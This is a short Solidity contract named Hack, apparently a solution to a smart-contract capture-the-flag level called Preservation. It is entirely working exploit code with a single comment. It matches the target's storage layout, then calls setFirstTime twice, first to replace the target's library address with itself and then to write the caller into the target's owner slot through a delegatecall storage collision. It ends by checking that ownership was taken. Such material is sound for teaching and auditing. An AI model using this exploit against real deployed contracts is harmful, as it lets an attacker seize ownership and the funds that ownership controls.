pragma solidity ^0.8;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Hack {
    // Align storage layout same as Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}